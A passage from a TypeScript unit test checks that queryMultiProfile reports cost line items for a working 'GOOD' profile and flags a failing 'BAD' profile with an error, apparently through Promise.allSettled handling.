    { ...TEST_PROFILE, name: 'GOOD' },
    { ...TEST_PROFILE, name: 'BAD' },
  ]
  const results = await queryMultiProfile(profiles, TEST_RANGE, requestFn)
  assert.equal(results.length, 2)
  const good = results.find((r) => r.profileName === 'GOOD')
  const bad = results.find((r) => r.profileName === 'BAD')
  assert.ok(good && good.costApiFailed === false && good.lineItems.length > 0)
  assert.ok(bad && bad.costApiFailed === true)
  assert.ok(bad!.error) // s.reason.message, mapped by queryMultiProfile's Promise.allSettled branch
})
